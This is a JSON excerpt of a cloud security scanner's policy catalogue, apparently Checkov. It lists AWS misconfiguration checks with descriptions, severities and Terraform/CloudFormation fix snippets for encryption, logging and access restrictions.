        "description": "Transfer Server is publicly  exposed\nDescription\nBy ensuring that your Azure Transfer Server is not public, you can help protect your data from unauthorized access or tampering. Public Azure Transfer Servers are accessible over the internet, which can make them vulnerable to external threats such as hackers or malware. By making it private, you can help ensure that only authorized users can access the data.\nFix - Buildtime \nTerraform\n\nResource: aws_transfer_server\nArgument: endpoint_type\n\naws_s3_bucket.test.tfresource \"aws_transfer_server\" \"test\" {\n  + endpoint_type = \"VPC\"\n    protocols   = [\"SFTP\"]\n}\n\nCloudFormation\n\nResource: AWS::Transfer::Server\nArgument: Properties.EndpointType\n\nYAMLResources: \n  VPC:\n    Type: AWS::Transfer::Server\n    Properties: \n        ...\n+     EndpointType: \"VPC\" # or \"VPC_ENDPOINT\"\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_176": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_31",
        "description": "AWS WAF Web Access Control Lists logging is disabled \nDescription\nAmazon WAF is a web application firewall service that lets you monitor web requests that are forwarded to Amazon API Gateway APIs, Amazon CloudFront distributions, or Application Load Balancers in order to help protect them from attacks. To get detailed information about the web traffic analyzed by your Web Access Control Lists (Web ACLs) you must enable logging. The log entries include the time that Amazon WAF received the request from your AWS resource, detailed information about the request, and the action for the rule that each request matched. You can also send these logs to an Amazon Kinesis Firehose delivery stream with a configured storage destination.\nFix - Buildtime\nTerraform\nResource: aws_waf_web_acl\nAttribute: logging_configuration\nGoresource \"aws_waf_web_acl\" \"example\" {\n  # ... other configuration ...\n  logging_configuration {\n    log_destination = \"${aws_kinesis_firehose_delivery_stream.example.arn}\"\n\n    redacted_fields {\n      field_to_match {\n        type = \"URI\"\n      }\n\n      field_to_match {\n        data = \"referer\"\n        type = \"HEADER\"\n      }\n    }\n  }\n}\n",
        "severity": "TBD"
    },
    "CKV2_AWS_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-guardduty-is-enabled-to-specific-orgregion",
        "description": "GuardDuty is not enbaled to specific org/region\nDescription\nGuardDuty is a security service provided by Amazon Web Services (AWS) that uses machine learning and threat intelligence to detect potential threats to your AWS accounts and workloads. Enabling GuardDuty in specific regions or within your organization can help you to identify and respond to potential threats more quickly and effectively. This can help to reduce the risk of security breaches and protect your data and systems from malicious activity. \nFix - Buildtime \nTerraform\n\nResource: aws_guardduty_detector, aws_guardduty_organization_configuration\nArgument: auto_enable of aws_guardduty_organization_configuration\n\nGoresource \"aws_guardduty_detector\" \"ok\" {\n  enable = true\n}\n\nresource \"aws_guardduty_organization_configuration\" \"example\" {\n  auto_enable = true\n  detector_id = aws_guardduty_detector.ok.id\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_166": {
        "url": "https://docs.bridgecrew.io/docs/ensure-backup-vault-is-encrypted-at-rest-using-kms-cmk",
        "description": "Backup Vault is not encrypted at rest using KMS CMK\nDescription\nEncrypting your data and resources with KMS helps protect your data from unauthorized access or tampering. By encrypting your data, you can ensure that only authorized users can access and decrypt the data, and that the data is protected while in storage or in transit. Such action can help protect against external threats such as hackers or malware, as well as internal threats such as accidental or unauthorized access.\nFix - Buildtime \nTerraform\n\nResource: aws_backup_vault\nArgument:  kms_key_arn\n\naws_s3_bucket.test.tfresource \"aws_backup_vault\" \"backup_with_kms_key\" {\n    ...\n  + kms_key_arn = aws_kms_key.example.arn\n}\n\nCloudFormation\n\nResource: AWS::Backup::BackupVault\nArgument:  Properties.EncryptionKeyArn\n\nYAMLType: AWS::Backup::BackupVault\n    Properties:\n      ...\n+     EncryptionKeyArn: example.arn/aws_kms_key\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_167": {
        "url": "https://docs.bridgecrew.io/docs/ensure-glacier-vault-access-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it",
        "description": "Glacier Vault access policy is public and not restricted to specific services or principals\nDescription\nIt is generally a best practice to restrict access to Amazon S3 Glacier vaults to only the specific services or principals that require access. This can help to reduce the risk of unauthorized access to the data stored in your vaults and protect against potential data breaches.\nFix - Buildtime \nTerraform\n\nResource: aws_glacier_vault\nArgument:  Statement\n\naws_s3_bucket.test.tfresource \"aws_glacier_vault\" \"my_archive1\" {\n  ...\n  access_policy = <<EOF\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Sid\": \"add-read-only-perm\",\n          \"Principal\": \"*\",\n       +  \"Effect\": \"Deny\",\n          \"Action\": [\n             \"glacier:InitiateJob\",\n             \"glacier:GetJobOutput\"\n          ],\n          \"Resource\": \"arn:aws:glacier:eu-west-1:432981146916:vaults/MyArchive\"\n       }\n    ]\n    }\n}\n",
        "severity": "MEDIUM"
    },
    "CKV2_AWS_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-cloudtrail-trails-are-integrated-with-cloudwatch-logs",
        "description": "CloudTrail trail is not integrated with CloudWatch Log\nDescription\nAWS CloudTrail is a web service that records AWS API calls made in a given AWS account. The recorded information includes the identity of the API caller, the time of the API call, the source IP address of the API caller, the request parameters, and the response elements returned by the AWS service. CloudTrail uses Amazon S3 for log file storage and delivery, so log files are stored durably. In addition to capturing CloudTrail logs within a specified S3 bucket for long term analysis, realtime analysis can be performed by configuring CloudTrail to send logs to CloudWatch logs. For a trail that is enabled in all regions in an account, CloudTrail sends log files from all those regions to a CloudWatch logs log group. It is recommended that CloudTrail logs be sent to CloudWatch logs.\n\ud83d\udcd8NoteThe intent of this recommendation is to ensure AWS account activity is being captured, monitored, and appropriately alarmed on. CloudWatch logs is a native way to accomplish this using AWS services but does not preclude the use of an alternate solution.\nSending CloudTrail logs to CloudWatch logs will facilitate real-time and historic activity logging based on user, API, resource, and IP address, and provides opportunity to establish alarms and notifications for anomalous or sensitivity account activity.\nFix - Buildtime \nTerraform\n\nResource: aws_cloudtrail\nArgument: cloud_watch_logs_group_arn\n\nGoresource \"aws_cloudtrail\" \"aws_cloudtrail_ok\" {\n  name                          = \"tf-trail-foobar\"\n  cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\"\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_168": {
        "url": "https://docs.bridgecrew.io/docs/ensure-sqs-queue-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it",
        "description": "SQS queue policy is public and access is not restricted to specific services or principals\nDescription\nIt is generally a best practice to restrict access to Amazon Simple Queue Service (SQS) queues to only the specific services or principals that require access. This can help to reduce the risk of unauthorized access to the data stored in your queues and protect against potential data breaches.\nFix - Buildtime \nTerraform\n\nResource: aws_sqs_queue_policy\nArgument:  Statement\n\naws_s3_bucket.test.tfresource \"aws_sqs_queue_policy\" \"test\" {\n  ... \n  policy = <<POLICY\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Principal\": \"*\",\n+         \"Effect\": \"Deny\",\n          \"Action\": \"sqs:SendMessage\",\n          \"Resource\": \"${aws_sqs_queue_policy.q.arn}\"\n       }\n    ]\n}\nPOLICY\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_169": {
        "url": "https://docs.bridgecrew.io/docs/ensure-sns-topic-policy-is-not-public-by-only-allowing-specific-services-or-principals-to-access-it",
        "description": "SNS topic policy is public and access is not restricted to specific services or principals\nDescription\nIt is generally a best practice to restrict access to Amazon SNS topics to only the specific services or principals that require access. This can help to reduce the risk of unauthorized access to the data stored in your topics and protect against potential data breaches.\nFix - Buildtime \nTerraform\n\nResource: aws_sns_topic_policy\nArgument:  Statement\n\naws_s3_bucket.test.tfresource \"aws_sns_topic_policy\" \"sns_tp1\" {\n    ...\n  policy = <<POLICY\n{\n    \"Version\":\"2012-10-17\",\n    \"Statement\":[\n       {\n          \"Principal\": \"*\",\n    +     \"Effect\": \"Deny\",\n          \"Action\": [\n            \"SNS:Subscribe\",\n            \"SNS:SetTopicAttributes\",\n            \"SNS:RemovePermission\",\n            \"SNS:Receive\",\n            \"SNS:Publish\",\n            \"SNS:ListSubscriptionsByTopic\",\n            \"SNS:GetTopicAttributes\",\n            \"SNS:DeleteTopic\",\n            \"SNS:AddPermission\",\n          ],\n          \"Resource\": \"${aws_sns_topic.test.arn}\"\n       }\n    ]\n}\nPOLICY\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_177": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_97",
        "description": "[Policy Title]\nDescription\nThis is a simple check to ensure that Kinesis Video Stream is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster.\nFix - Buildtime\nTerraform\n\nResource: aws_kinesis_video_stream\nAttribute: kms_key_id - (Optional) The ID of the AWS Key Management Service (AWS KMS) key that you want Kinesis Video Streams to use to encrypt stream data. If no key ID is specified, the default, Kinesis Video-managed key (aws/kinesisvideo) is used.\n\nGoresource \"aws_kinesis_video_stream\" \"default\" {\n  name                    = \"terraform-kinesis-video-stream\"\n  data_retention_in_hours = 1\n  device_name             = \"kinesis-video-device-name\"\n  media_type              = \"video/h264\"\n  + kms_ke_id                             = \"ckv_kms\"\n  tags = {\n    Name = \"terraform-kinesis-video-stream\"\n  }\n}\n",
        "severity": "TBD"
    },
    "CKV_AWS_179": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_99",
        "description": "AWS FSX Windows filesystem not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that FSX Windows file system is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster\nFix - Buildtime\nTerraform\n\nResource: aws_fsx_windows_file_system\nAttribute:  kms_key_id\n\nGoresource \"aws_fsx_windows_file_system\" \"example\" {\n  active_directory_id = aws_directory_service_directory.example.id\n  kms_key_id          = aws_kms_key.example.arn\n  storage_capacity    = 300\n  subnet_ids          = [aws_subnet.example.id]\n  throughput_capacity = 1024\n}\n",
        "severity": "TBD"
    },
    "CKV_AWS_181": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_101",
        "description": "AWS S3 Object Copy not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that the S3 Object Copy is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster.\nFix - Buildtime\nTerraform\n\nResource: aws_s3_object_copy\nAttribute: kms_key_id - (Optional) Specifies the AWS KMS Key ARN to use for object encryption. This value is a fully qualified ARN of the KMS Key. \n\nGoresource \"aws_s3_object_copy\" \"test\" {\n  bucket = \"destination_bucket\"\n  key    = \"destination_key\"\n  source = \"source_bucket/source_key\"\n+ kms_key_id = \"aws_kms_key.foo.arn\"\n\n\n  grant {\n    uri         = \"http://acs.amazonaws.com/groups/global/AllUsers\"\n    type        = \"Group\"\n    permissions = [\"READ\"]\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_171": {
        "url": "https://docs.bridgecrew.io/docs/ensure-emr-cluster-security-configuration-encryption-uses-sse-kms",
        "description": "EMR cluster is not configured with SSE KMS for data at rest encryption (Amazon S3 with EMRFS)\nDescription\nEnabling Amazon S3 Server-Side Encryption with AWS Key Management Service (SSE-KMS) for your Amazon Elastic MapReduce (EMR) cluster's security configuration can help to protect the data stored in your cluster.\nSSE-KMS uses a customer master key (CMK) in the AWS KMS to encrypt and decrypt data stored in Amazon S3. \nFix - Buildtime \nTerraform\n\nResource: aws_emr_security_configuration\nArgument:  EnableAtRestEncryption\n\naws_emr_security_configuration.test.tfresource \"aws_emr_security_configuration\" \"test\" {\n  ...\n  configuration = <<EOF\n{\n  \"EncryptionConfiguration\": {\n    \"EnableAtRestEncryption\": true,\n    \"AtRestEncryptionConfiguration\": {\n      \"S3EncryptionConfiguration\": {\n+       \"EncryptionMode\": \"SSE-KMS\",\n+       \"AwsKmsKey\": \"${module.encryption_module.kms_key_alias}\"\n      },\n      \"LocalDiskEncryptionConfiguration\": {\n        \"EncryptionKeyProviderType\": \"AwsKms\",\n        \"AwsKmsKey\": \"${module.encryption_module.kms_key_alias}\"\n      }\n    },\n    \"EnableInTransitEncryption\": true\n  }\n}\nEOF\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_182": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_102",
        "description": "AWS  Doc DB not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that the DocDB is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster.\nFix - Buildtime\nTerraform\n\nResource: aws_docdb_cluster\nArgument: kms_key_id - (Optional) The ARN for the KMS encryption key. When specifying kms_key_id, storage_encrypted needs to be set to true.\n\nGoresource \"aws_docdb_cluster\" \"docdb\" {\n  cluster_identifier      = \"my-docdb-cluster\"\n  engine                  = \"docdb\"\n  master_username         = \"foo\"\n  master_password         = \"mustbeeightchars\"\n  backup_retention_period = 5\n  preferred_backup_window = \"07:00-09:00\"\n  skip_final_snapshot     = true\n+ kms_key_id                        = \"ckv_kms\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_187": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_107",
        "description": "AWS Sagemaker domain not encrypted using Customer Managed Key\nDescription\nAmazon SageMaker Feature Store enables you to create two types of stores: an online store or offline store. The online store is used for low latency real-time inference use cases whereas the offline store is used for training and batch inference use cases. When you create a feature group for online or offline use you can provide a AWS Key Management Service customer managed key to encrypt all your data at rest. In case you do not provide a AWS KMS key then we ensure that your data is encrypted on the server side using an AWS owned AWS KMS key or AWS managed AWS KMS key.\nFix - Buildtime\nTerraform\n\nResource: aws_sagemaker_domain\nArgument: kms_key_id - (Optional) The AWS KMS customer managed CMK used to encrypt the EFS volume attached to the domain.\n\nGoresource \"aws_sagemaker_domain\" \"example\" {\n  domain_name = \"example\"\n  auth_mode   = \"IAM\"\n  vpc_id      = aws_vpc.test.id\n  subnet_ids  = [aws_subnet.test.id]\n  + kms_key_id = \"ckv_kms\"\n  default_user_settings {\n    execution_role = aws_iam_role.test.arn\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_95": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_logging_30",
        "description": "AWS API Gateway V2 has Access Logging is disabled\nDescription\nEnabling the custom access logging option in API Gateway allows delivery of custom logs to CloudWatch Logs, which can be analyzed using CloudWatch Logs Insights. Using custom domain names in Amazon API Gateway allows insights into requests sent to each custom domain name. If there is more than one custom domain name mapped to a single API, understanding the quantity and type of requests by domain name may help understand request patterns.\nFix - Runtime \nAWS Console\nProcedure:\n\nLog in to the AWS Management Console at [https://console.aws.amazon.com/].\nOpen the Amazon API Gateway console.\nFind the Stage Editor for your API.\nOn the Stage Editor pane, choose the Logs/Tracing tab.\nOn the Logs/Tracing tab, under CloudWatch Settings, do the following to enable execution logging.\nSelect the Enable CloudWatch Logs check box.\nFor Log level, choose INFO to generate execution logs for all requests. Or, choose ERROR to generate execution logs only for requests to your API that result in an error.\nSelect the Log full requests/responses data check box for a REST API. Or, select the Log full message data check box for a WebSocket API.\nUnder Custom Access Logging, select the Enable Access Logging check box.\nFor Access Log Destination ARN, enter the ARN of a CloudWatch log group or an Amazon Kinesis Data Firehose stream.\nEnter a Log Format. For guidance, you can choose CLF, JSON, XML, or CSV to see an example in that format.\nClick Save Changes.\n\nFix - Buildtime\nCloudFormation\n\nResource: AWS:: AWS::ApiGatewayV2::Stage\nArgument: AccessLogSettings\n\nYAMLMyStage:\n  Type: 'AWS::ApiGatewayV2::Stage'\n  Properties:\n    StageName: Prod\n    Description: Prod Stage\n    DeploymentId: !Ref MyDeployment\n    ApiId: !Ref CFNWebSocket\n    DefaultRouteSettings:\n      DetailedMetricsEnabled: true\n      LoggingLevel: INFO\n      DataTraceEnabled: false\n      ThrottlingBurstLimit: 10\n      ThrottlingRateLimit: 10\n  +  AccessLogSettings:\n      DestinationArn: 'arn:aws:logs:us-east-1:123456789:log-group:my-log-group'\n      Format: >-\n        {\"requestId\":\"$context.requestId\", \"ip\": \"$context.identity.sourceIp\",\n        \"caller\":\"$context.identity.caller\",\n        \"user\":\"$context.identity.user\",\"requestTime\":\"$context.requestTime\",\n        \"eventType\":\"$context.eventType\",\"routeKey\":\"$context.routeKey\",\n        \"status\":\"$context.status\",\"connectionId\":\"$context.connectionId\"}\n",
        "severity": "LOW"
    },
    "CKV_AWS_150": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_networking_62",
        "description": "Deletion protection disabled for load balancer\nDescription\nThis policy identifies Elastic Load Balancers v2 (ELBv2) which are configured with deletion protection feature disabled. Enabling delete protection for these ELBs prevents irreversible data loss resulting from accidental or malicious operations.\nFor more details refer: https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html#deletion-protection\nFix - Runtime\nAWS Console\n\nLog in to the AWS console\nIn the console, select the specific region from the region drop-down on the top right corner, for which the alert is generated\nGo to the EC2 Dashboard, and select 'Load Balancers'\nClick on the reported Load Balancer\nOn the Description tab, choose 'Edit attributes'\nOn the Edit load balancer attributes page, select 'Enable' for 'Delete Protection'\nClick on 'Save' to save your changes\n\nFix - Buildtime \nTerraform\n\nResource: aws_lb\nArgument: enable_deletion_protection\n\nGoresource \"aws_lb\" \"test_success\" {\n  ...\n+ enable_deletion_protection = true\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_180": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_100",
        "description": "AWS Image Builder component not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that Image builder component is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the component.\nFix - Buildtime\nTerraform\n\nResource: aws_imagebuilder_component\nAttribute: kms_key_id - (Optional) Amazon Resource Name (ARN) of the Key Management Service (KMS) Key used to encrypt the component.\n\nGoresource \"aws_imagebuilder_component\" \"example\" {\n  data = yamlencode({\n    phases = [{\n      name = \"build\"\n      steps = [{\n        action = \"ExecuteBash\"\n        inputs = {\n          commands = [\"echo 'hello world'\"]\n        }\n        name      = \"example\"\n        onFailure = \"Continue\"\n      }]\n    }]\n    schemaVersion = 1.0\n  })\n  name     = \"example\"\n  platform = \"Linux\"\n  version  = \"1.0.0\"\n  kms_key_id = \"ckv_kms\"\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_183": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_103",
        "description": "AWS EBS Snapshot Copy not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that the EBS Snapshot copy is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the snapshot.\nFix - Buildtime\nTerraform\n\nResource: aws_ebs_snapshot_copy\nAttribute: kms_key_id - The ARN for the KMS encryption key.\n\nGoresource \"aws_ebs_snapshot_copy\" \"example_copy\" {\n  source_snapshot_id = aws_ebs_snapshot.example_snapshot.id\n  source_region      = \"us-west-2\"\n  + kms_key_id           = \"ckv_kms\"\n  tags = {\n    Name = \"HelloWorld_copy_snap\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_184": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_104",
        "description": "AWS Elastic File System (EFS) not encrypted using Customer Managed Key\nDescription\nThis policy identifies Elastic File Systems (EFSs) which are encrypted with default KMS keys and not with Keys managed by Customer. It is a best practice to use customer managed KMS Keys to encrypt your EFS data. It gives you full control over the encrypted data.\nFix - Runtime\nAWS Console\nAWS EFS Encryption of data at rest can only be enabled during file system creation. So to resolve this alert, create a new EFS with encryption enabled with the customer-managed key, then migrate all required data from the reported EFS to this newly created EFS and delete reported EFS.\nTo create new EFS with encryption enabled, perform the following:\n\nSign into the AWS console\nIn the console, select the specific region from region drop down on the top right corner, for which the alert is generated\nNavigate to EFS dashboard\nClick on 'File systems' (Left Panel)\nClick on 'Create file system' button\nOn the 'Configure file system access' step, specify EFS details as per your requirements and Click on 'Next Step'\nOn the 'Configure optional settings' step, Under 'Enable encryption' Choose 'Enable encryption of data at rest' and Select customer managed key [i.e. Other than (default)aws/elasticfilesystem] from 'Select KMS master key' dropdown list along with other parameters and Click on 'Next Step'\nOn the 'Review and create' step, Review all your setting and Click on 'Create File System' button\n\nTo delete reported EFS which does not has encryption, perform the following:\n\nSign into the AWS console\nIn the console, select the specific region from region drop down on the top right corner, for which the alert is generated\nNavigate to EFS dashboard\nClick on 'File systems' (Left Panel)\nSelect the reported file system\nClick on 'Actions' drop-down\nClick on 'Delete file system'\nIn the 'Permanently delete file system' popup box, To confirm the deletion enter the file system's ID and Click on 'Delete File System\n\nFix - Buildtime\nTerraform\n\nResource: aws_efs_file_system\nArguments: encrypted\n\nGoresource \"aws_efs_file_system\" \"enabled\" {\n  creation_token = \"example\"\n  kms_key_id = <kms key>\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_186": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_106",
        "description": "AWS S3 Object Copy not encrypted using Customer Managed Key\nDescription\nThis is a simple check to ensure that the S3 bucket Object is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the object.\nFix - Buildtime\nTerraform\n\nResource: aws_s3_bucket_object\nAttribute: kms_key_id - (Optional) Specifies the AWS KMS Key ARN to use for object encryption. This value is a fully qualified ARN of the KMS Key. \n\nGoresource \"aws_s3_bucket_object\" \"object\" {\n  bucket = \"your_bucket_name\"\n  key    = \"new_object_key\"\n  source = \"path/to/file\"\n+ kms_key_id = \"ckv_kms\"\n\n  # The filemd5() function is available in Terraform 0.11.12 and later\n  # For Terraform 0.11.11 and earlier, use the md5() function and the file() function:\n  # etag = \"${md5(file(\"path/to/file\"))}\"\n  etag = filemd5(\"path/to/file\")\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_189": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_109",
        "description": "AWS EBS Volume not encrypted using Customer Managed Key\nDescription\nAmazon EBS automatically creates a unique AWS managed key in each Region where you store AWS resources. This KMS key has the alias alias/aws/ebs. By default, Amazon EBS uses this KMS key for encryption. Alternatively, you can specify a symmetric customer managed key that you created as the default KMS key for EBS encryption. Using your own KMS key gives you more flexibility, including the ability to create, rotate, and disable KMS keys.\nFix - Buildtime\nTerraform\n\nResource: aws_ebs_volume\nAttribute: kms_key_id - (Optional) The ARN for the KMS encryption key. When specifying kms_key_id, encrypted needs to be set to true. Note: Terraform must be running with credentials which have the GenerateDataKeyWithoutPlaintext permission on the specified KMS key as required by the EBS KMS CMK volume provisioning process to prevent a volume from being created and almost immediately deleted.\n\nGoresource \"aws_ebs_volume\" \"example\" {\n  availability_zone = \"us-west-2a\"\n  size              = 40\n+ kms_key_id = \"ckv_kms\"\n  tags = {\n    Name = \"HelloWorld\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_190": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_110",
        "description": "Ensure lustre file systems is encrypted by KMS using a customer managed Key (CMK)\nDescription\nAmazon FSx for Lustre uses a KMS key, either the AWS managed key for Amazon FSx or a custom KMS key, to encrypt and decrypt file system data. All scratch FSx for Lustre file systems are encrypted at rest with keys managed by the service. Data is encrypted using an XTS-AES-256 block cipher. Data is automatically encrypted before being written to the file system, and is automatically decrypted as it is read. The keys used to encrypt scratch file systems at-rest are unique per file system and destroyed after the file system is deleted. For persistent file systems, you choose the KMS key used to encrypt and decrypt data, either the AWS managed key for Amazon FSx or a custom KMS key. You specify which key to use when you create a persistent file system. You can enable, disable, or revoke grants on this KMS key.\nFix - Buildtime\nTerraform\n\nResource: aws_fsx_windows_file_system\nArgument: kms_key_id\n\nGoresource \"aws_fsx_windows_file_system\" \"example\" {\n  active_directory_id = aws_directory_service_directory.example.id\n  kms_key_id          = aws_kms_key.example.arn\n  storage_capacity    = 300\n  subnet_ids          = [aws_subnet.example.id]\n  throughput_capacity = 1024\n}\n",
        "severity": "TBD"
    },
    "CKV_AWS_191": {
        "url": "https://docs.bridgecrew.io/docs/bc_aws_general_111",
        "description": "AWS Elasticache replication group not configured with CMK key\nDescription\nElastiCache for Redis offers default (service managed) encryption at rest, as well as ability to use your own symmetric customer managed AWS KMS keys in AWS Key Management Service (KMS).\nData stored on SSDs (solid-state drives) in data tiering enabled clusters is always encrypted by default. However, when the cluster is backed up, the snapshot data is not automatically encrypted. Encryption needs to be enabled on the snapshot.\nFix - Buildtime\nTerraform\n\nResource: aws_elasticache_replication_group\nAttribute: kms_key_id - (Optional) The ARN of the key that you wish to use if encrypting at rest. If not supplied, uses service managed encryption. Can be specified only if at_rest_encryption_enabled = true.\n\nGoresource \"aws_elasticache_replication_group\" \"example\" {\n  automatic_failover_enabled    = true\n  availability_zones            = [\"us-west-2a\", \"us-west-2b\"]\n  replication_group_id          = \"tf-rep-group-1\"\n  replication_group_description = \"test description\"\n  node_type                     = \"cache.m4.large\"\n  number_cache_clusters         = 2\n  parameter_group_name          = \"default.redis3.2\"\n  port                          = 6379\n\n  \n  + kms_key_id = \"arm:ckv\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_23": {
        "url": "https://docs.bridgecrew.io/docs/ensure-route53-a-record-has-an-attached-resource",
        "description": "Route53 A Record does not have Attached Resource\nDescription\nThis check ensures that Route53 A records point to resources part of your Account rather than just random IP addresses. On the platform this check additionally compares IP's against provisioned EIP. In Checkov the graph correlates the A record against know AWS resources from EIP to Global Accelerator.\nFix - Buildtime\nTerraform\n** Resource: aws_route53_record\nGoresource \"aws_route53_record\" \"pass\" {\n  zone_id = data.aws_route53_zone.primary.zone_id\n  name    = \"dns.freebeer.site\"\n  type    = \"A\"\n  ttl     = \"300\"\n  records = [aws_eip.fixed.public_ip]\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_AWS_228": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-elasticsearch-domain-uses-an-updated-tls-policy",
        "description": "AWS Elasticsearch domain does not use an updated TLS policy\nDescription\nThe Transport Layer Security (TLS) protocol secures transmission of data between servers and web browsers, over the Internet, using standard encryption technology. To follow security best practices and the latest PCI compliance standards, enable the latest version of TLS protocol (i.e. TLS 1.2) for all your AWS Elasticsearch domains.\nFix - Runtime\nFix - Buildtime\nGoresource \"aws_elasticsearch_domain\" \"pass\" {\n  domain_name = \"pass\"\n\n  domain_endpoint_options {\n    enforce_https       = false\n    tls_security_policy = \"Policy-Min-TLS-1-2-2019-07\"\n  }\n\n  cluster_config {\n    instance_count = 2\n  }\n\n  encrypt_at_rest {\n    enabled = false\n  }\n\n  node_to_node_encryption {\n    enabled = false\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_232": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-nacl-does-not-allow-ingress-from-00000-to-port-22",
        "description": "AWS NACL allows ingress from 0.0.0.0/0 to port 22\nDescription\nNetwork Access Control List (NACL) is stateless and provides filtering of ingress/egress network traffic to AWS resources. We recommend that NACLs do not allow unrestricted ingress access to port 22. Removing unfettered connectivity to remote console services, such as SSH, reduces a server's exposure to risk.\nFix - Buildtime\nCloudFormation\nYAMLResources:  \n  InboundRule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n       NetworkAclId:\n         Ref: MyNACL\n       RuleNumber: 200\n       Protocol: 6\n       RuleAction: allow\n-      CidrBlock: 0.0.0.0/0\n+      CidrBlock: 10.0.0.0/32\n       PortRange:\n         From: 22\n         To: 22\n\nTerraform\nGoresource \"aws_network_acl_rule\" \"example\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 200\n  egress         = false\n  protocol       = \"tcp\"\n  rule_action    = \"allow\"\n- cidr_block     = \"0.0.0.0/0\"\n+ cidr_block     = \"10.0.0.0/32\"\n  from_port      = 22\n  to_port        = 22\n}\n",
        "severity": "LOW"
    },
    "CKV_AWS_120": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-api-gateway-caching-is-enabled",
        "description": "AWS API Gateway caching is disabled\nDescription\nA cache cluster caches responses. With caching, you can reduce the number of calls made to your endpoint and also improve the latency of requests to your API.\nFix - Runtime\n\nGo to the API Gateway console.\nSelect an API.\nSelect Stages.\nIn the Stages list for the API, select the required stage.\nGo to the Settings tab.\nSelect Enable API cache.\nWait until cache creation is complete.\n\nFix - Buildtime\nTerraform\nresource \"aws_api_gateway_rest_api\" \"example\" {\n...\n  + cache_cluster_enabled = true\n...\n}\n\nCloudFormation\nResources:\n  Prod:\n    Type: AWS::ApiGateway::Stage\n    Properties:\n      ...\n      + CacheClusterEnabled: True\n",
        "severity": "LOW"
    },
    "CKV_AWS_198": {
        "url": "https://docs.bridgecrew.io/docs/ensure-aws-rds-security-groups-are-defined",
        "description": "AWS RDS security groups are not defined\nDescription\nBy ensuring that AWS RDS security groups are defined, you can help protect your instances from unauthorized access and ensure that only authorized traffic is allowed to reach your instances. This can help prevent data breaches and other security incidents, and can also help ensure that your instances are not overwhelmed by unwanted traffic.\nFix - Buildtime\nTerraform\nGoresource \"aws_db_security_group\" \"exists\" {\n  name = \"rds_sg\"\n\n  ingress {\n    cidr = \"10.0.0.0/24\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV2_AWS_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-rds-clusters-has-backup-plan-of-aws-backup",
